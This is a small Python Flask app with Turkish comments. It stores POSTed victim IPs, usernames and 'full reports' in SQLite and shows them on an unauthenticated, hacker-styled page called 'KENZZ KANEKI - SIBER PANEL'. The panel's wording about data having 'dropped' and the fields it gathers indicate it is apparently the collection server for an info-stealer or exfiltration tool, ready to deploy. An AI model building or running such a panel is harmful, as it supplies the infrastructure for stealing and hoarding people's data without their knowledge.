from flask import Flask, request, jsonify, render_template_string
import sqlite3, os

app = Flask(__name__)
# Render gibi bulut sistemlerde veritabanı yolu
DB_PATH = "/tmp/data.db" 

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, user TEXT, report TEXT, date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

@app.route('/api/data', methods=['POST'])
def receive_data():
    data = request.json
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT INTO logs (ip, user, report) VALUES (?, ?, ?)", (data['ip'], data['user'], data['full_report']))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"}), 200

@app.route('/kenzz-kontrol')
def view_data():
    if not os.path.exists(DB_PATH): return "Henuz veri dusmedi kanka!"
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT ip, user, report, date FROM logs ORDER BY id DESC")
    rows = cur.fetchall()
    conn.close()
    
    html = """
    <html><head><title>Kenzz Kaneki Panel</title><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;} table{border:1px solid #0f0;width:100%;} th,td{border:1px solid #0f0;padding:10px;text-align:left;} pre{white-space:pre-wrap;}</style></head>
    <body><h1>KENZZ KANEKI - SIBER PANEL</h1><table><tr><th>IP</th><th>Kullanici</th><th>Rapor</th><th>Tarih</th></tr>
    {% for row in rows %}
    <tr><td>{{row[0]}}</td><td>{{row[1]}}</td><td><pre>{{row[2]}}</pre></td><td>{{row[3]}}</td></tr>
    {% endfor %}
    </table></body></html>
    """
    return render_template_string(html, rows=rows)

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)